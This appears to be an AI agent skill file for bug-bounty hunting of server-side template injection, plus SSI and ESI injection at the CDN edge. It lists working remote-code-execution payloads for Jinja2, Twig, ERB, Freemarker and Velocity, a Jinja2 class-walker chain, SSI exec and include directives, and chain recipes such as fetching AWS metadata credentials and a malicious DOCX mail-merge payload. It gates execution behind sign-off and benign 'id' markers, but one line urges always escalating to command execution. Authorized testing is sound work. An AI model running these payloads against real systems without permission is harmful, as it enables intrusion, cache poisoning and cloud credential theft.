---
name: hunt-ssti
description: "Hunt server-side template injection across Jinja2, Twig, Freemarker, ERB, Spring, Velocity, Mako, Thymeleaf and Smarty: double-curly and dollar-curly math probes, engine fingerprinting from errors, escalation to RCE through engine-specific class walkers and execute utilities, plus Server-Side Includes (SSI) and Edge-Side Includes (ESI) injection at the CDN edge (Fastly, Varnish, Akamai). Targets: email templates, PDF and report generators, CMS previews, error pages with user input. Use when hunting RCE via template rendering or endpoints that compose strings with user input before render."
metadata:
  sources: hackerone_public, cve_database, public_research, apache_httpd_docs, nginx_docs, fastly_docs, varnish_docs, gosecure_research
  report_count: 6
---

## Autonomous Testing Priority

**Don't stop at arithmetic detection — but don't jump to RCE either.**

Arithmetic probes (`{{7*7}}→49`) confirm the injection point and are not proof of
impact. They also fail silently when the app echoes the input back (e.g. inside an
HTML attribute like `<input value="{{7*7}}">`), producing a false negative even
where injection exists. So arithmetic alone is neither sufficient nor reliable:
identify the **engine** next, through its distinguishing syntax and its error
messages, because engine plus a reachable sink is already a critical finding and
it is what tells you which payload family even applies.

**OS command execution is Stage B.** It needs explicit written sign-off naming the
host, a benign marker only (`id`, a sleep, an echoed canary — never a shell, a
write or persistence), and a unique canary diffed against a baseline captured
before the request, in the house style of `vmware-vcenter-attack` Step 4. The
payloads below use `popen('id')` for exactly that reason: keep it that way.

This priority is about **evidence quality, not speed**. Reporting "SSTI confirmed,
engine Jinja2, RCE reachable and not executed pending sign-off" is a complete,
critical finding. Running the command without the sign-off is not a better report,
it is an unauthorized intrusion.

**Order of attack:**
1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
   ```
   Content-Type: application/x-www-form-urlencoded
   field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
   JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
3. **If Jinja2 fails**, try Twig (PHP/Symfony), picking the payload by major version:
   - **Twig 1.x only:** `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`. Twig 2.0 changed `_self` to return the template name string, so this is dead on 2.x/3.x.
   - **Twig >= 2.10 / 3.x:** `{{['id']|filter('system')}}` or `{{['id']|map('system')|join}}` (a string callable handed to an arrow-function filter). Blocked in sandbox mode since 2.13.1 / 3.0.5, deprecated outside the sandbox since 3.15.0 (still executes on 3.x), rejected in Twig 4 (Closure-only).
4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.

**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.

---

## SSTI — SERVER-SIDE TEMPLATE INJECTION
> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
                   Nunjucks (Node) also gives 49 (JS coercion); Pebble / Jinjava (Java) also render {{7*7}} → 49.
{{'a'.toUpperCase()}} → A = Jinjava / Pebble (Java method call) or Nunjucks (JS); Jinja2 and Twig raise an error
{{this}}         → [object Object] = Handlebars (logic-less: {{7*7}} is a parse error there, never 49)
#{7*7}           → 49 with ${7*7} left literal = Pug (Node interpolation)
<%= 7*'7' %>     → 49 = EJS (Node, JS coercion); ERB raises TypeError (String can't be coerced into Integer)
```
When two engines share a probe result, the error text settles it: stack traces naming `pebble`, `jinjava`, `nunjucks`, `handlebars`, `pug` or `ejs` identify the engine outright.

### Error-based and boolean-error blind SSTI ("Successful Errors")
When arithmetic never renders (output not reflected, or reflected somewhere you cannot see), use the engine's **errors** as the oracle. Source: Vladislav Korchagin, *Successful Errors: New Code Injection and SSTI Techniques* (<https://github.com/vladko312/Research_Successful_Errors>), ranked #1 in PortSwigger's Top 10 web hacking techniques of 2025 (<https://portswigger.net/research/top-10-web-hacking-techniques-of-2025>). Covers Python, PHP, Java, Ruby, NodeJS and Elixir (Jinja2, Twig, Freemarker, Velocity, SpEL, OGNL, Dust.js, EEx among them).
- **Error-based:** make the engine throw an error whose message embeds the evaluated value (the SSTI analogue of SQLi `CONVERT(INT, ...)`). Needs verbose errors in the response.
- **Boolean error-based blind:** with generic errors, raise an error on only one branch and diff the response (status, length, timing, headers) against a baseline. Send equal-length pairs, one valid and one broken: `(3*4/2)` vs `3*)2(/4`, `((7*8)/(2*4))` vs `7)(*)8)(2/(*4`. Plain reflection treats both alike; an evaluating engine renders one and errors on the other. A generic error trigger is `(1/0).zxy.zxy`. Repeat each pair before trusting the differential.
- **Tool:** SSTImap (<https://github.com/vladko312/SSTImap>), current release v1.4 (2026-08-25). v1.3 (2025-08-19) added the error-based and boolean error-based blind techniques, a Spring EL plugin, Freemarker expression evaluation and a `|map()`-based Twig payload; v1.4 added a detect-only Mustache plugin (GHSA-5hrj-7fc3-cmx9) and Pybars. Use it for detection; its exploitation modes are Stage B like any other command execution.

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{# Twig 1.x only: from Twig 2.0 on, _self is the template name string #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{# Twig >= 2.10 / 3.x: string callable into an arrow-function filter (fails in sandbox mode and on Twig 4) #}
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Length-constrained injection fields (profile name, display name, subject)
When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
```python
{{ '7'*7 }}                                  # detection, fits anywhere
{{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```
The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

### CMS / "documentation" template-editor forms (authenticated)

Some SSTI lives behind a logged-in template editor (CMS "edit template" / product-template / email-template
preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three things break a naive attempt:

1. **Fingerprint BEFORE firing RCE — the engine decides the syntax.** Do NOT assume Jinja2. Probe the
   whole matrix and read which one evaluates:
   ```
   ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
   {{7*7}} → 49                      ⇒ Jinja2 / Twig (also Nunjucks, Pebble, Jinjava)
   {{this}} → [object Object]        ⇒ Handlebars (Node)
   #{7*7} → 49, ${7*7} literal       ⇒ Pug (Node)
   <%= 7*7 %> → 49                   ⇒ ERB (Ruby)
   *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
   ```
   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker** — stop sending `{{config...}}`.

2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to
   `POST /…/template?productId=N` with the id in the URL. The BODY carries only
   `csrf`, `template`, and a `template-action` (`preview` | `save`). Putting the id in the body returns
   `400 "Missing product id"`. So keep the id in the query string (`?productId=N`) AND send a
   form-encoded body of `csrf=…&template=<PAYLOAD>&template-action=preview`.

3. **Re-fetch the CSRF each time and use `preview` to iterate.** GET the editor page to read a *fresh*
   `csrf` hidden field; `template-action=preview` renders your payload WITHOUT persisting (fast feedback
   loop). Switch to `template-action=save` only once the payload is right, then trigger the render
   (load the public page that uses the template) to fire the command.

   **Freemarker documentation RCE** (the documented `Execute` utility — this IS the intended technique):
   ```
   <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
   ```
   Velocity equivalent: `#set($e="e");$e.getClass().forName("java.lang.Runtime")...`.

---

## SSI — SERVER-SIDE INCLUDES INJECTION

> **The engine-identification priority at the top of this skill applies here too, and the Stage B gate applies doubly.** SSI/ESI run at the web server or CDN edge, not in an application template engine, so a directive that executes hits shared infrastructure rather than one application. Command execution exists on **Apache only** and only when `Options Includes` (not `IncludesNOEXEC`) is set; **nginx SSI has no command-exec directive at all** (verified against the nginx `ngx_http_ssi_module` docs). Detect first; gate anything that reads a file, fetches a URL, or runs a command behind explicit operator sign-off.

SSI are directives placed in HTML and evaluated by the server as the page is served, format `<!--#directive param="value" -->`. File extensions `.shtml` / `.shtm` / `.stm` hint SSI but are not required. Apache enables it with `Options +Includes` plus `AddOutputFilter INCLUDES .shtml` (or `XBitHack`); nginx with `ssi on;` (and `ssi_types` to parse MIME types beyond `text/html` — relevant because nginx will parse SSI in a proxied upstream response if configured).

**Directive support differs by server (verified against vendor docs):**

| Server | echo / config / set / if | include (file read / internal fetch) | exec (OS command) |
| :-- | :-: | :-: | :-: |
| Apache `mod_include` | Yes | `#include file=`/`virtual=` (virtual can hit CGI) | `#exec cmd=` via `/bin/sh` — off under `IncludesNOEXEC` |
| nginx `ngx_http_ssi_module` | `echo`/`config`/`set`/`if`/`block`/`include` | `include` (subrequest) | **none — no exec command exists** |

**Stage A — detect (benign, non-destructive).** Reflect a value-echo directive into any field that lands in server-parsed HTML and see if it renders instead of echoing literally:
```
<!--#echo var="DATE_LOCAL" -->      # renders a date  => SSI is being parsed
<!--#printenv -->                    # Apache: dumps CGI env (info disclosure on its own)
```
A literal echo of the directive back = not parsed = no finding.

**Stage B — execute (requires explicit scope sign-off).** `#include virtual="/internal/..."` performs an internal request (SSRF-shaped — inherit the `hunt-ssrf` gate before firing one at a non-public path); `#include file=` reads a server file; `#exec cmd=` is Apache-only RCE. Confirm with a unique benign canary echoed back and a body-diff against the pre-injection baseline before claiming impact. Do not run a command that writes, deletes, or opens a network connection off-box.

## ESI — EDGE-SIDE INCLUDES INJECTION

ESI are cache-edge directives: a CDN or caching proxy resolves `<esi:...>` tags before serving. If an attacker injects an ESI tag into content the edge then parses, the edge renders attacker markup — **and because the response is cached, it is served to every visitor.** The supported-directive set is the whole finding: it varies sharply by vendor, so a payload that works on one edge is inert on another.

**Vendor support (verified this session against Fastly and Varnish docs; Akamai extensions marked):**

| Edge | Tags supported | Variables | Cookies | Enable / notes |
| :-- | :-- | :-: | :-: | :-- |
| **Fastly** | `esi:include`, `esi:comment`, `esi:remove` only | No | No | must flag the request with the `esi()` statement in `vcl_fetch` |
| **Varnish** | `esi:include`, `esi:remove` only | No | No | variable/cookie substitution not implemented; `src="https://…"` includes ignored unless `esi_ignore_https` feature set |
| **Akamai** | `esi:include` + `esi:vars`, `esi:choose/when/otherwise`, `esi:assign` | Yes | Yes (Property Manager `pass_set_cookie` passes origin cookies to the ESI processor) | the extended attack directives GoSecure documented (`$add_header`, `esi:debug`, `$(HTTP_COOKIE)`) are per their research, **not vendor-confirmed this session — treat as unverified** |

**Stage A — detect (benign, cache-busted).** The response header `Surrogate-Control: content="ESI/1.0"` announces ESI, but its absence does not prove ESI is off. Blind test with a comment-strip, which performs no fetch:
```
hell<!--esi-->o        # if it renders as "hello", the edge is parsing ESI
```
Always add a unique cache-buster query param to every probe so it lands on a cache MISS under a throwaway key — never persist a poisoned entry under the real, victim-shared key (same discipline as `hunt-cache-poison`).

**Stage B — execute (requires explicit scope sign-off).** `<esi:include src="…">` that fetches an attacker-controlled or internal URL is **SSRF** — inherit the `hunt-ssrf` gate before firing one. **Never reference a cookie or ESI variable inside an include**, since on a cookie-capable edge that exfiltrates a real user's session to wherever the include points. Confirm interpretation with a benign canary + body-diff; stop at "the edge executed my benign tag."

---

## Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`hunt-cache-poison`** — ESI injection (see the ESI section above) lives at the CDN/cache edge, so an interpreted `<esi:...>` tag in a cacheable response is stored and served to every visitor. Chain primitive: inject an ESI tag reflected into a cached page → edge renders attacker markup for all clients hitting that edge = cache poisoning at ESI level. Always cache-bust detection probes; cross-reference that skill's unkeyed-input and blast-radius discipline.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback (1.x only) or `|filter('system')` (2.10+/3.x), Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.
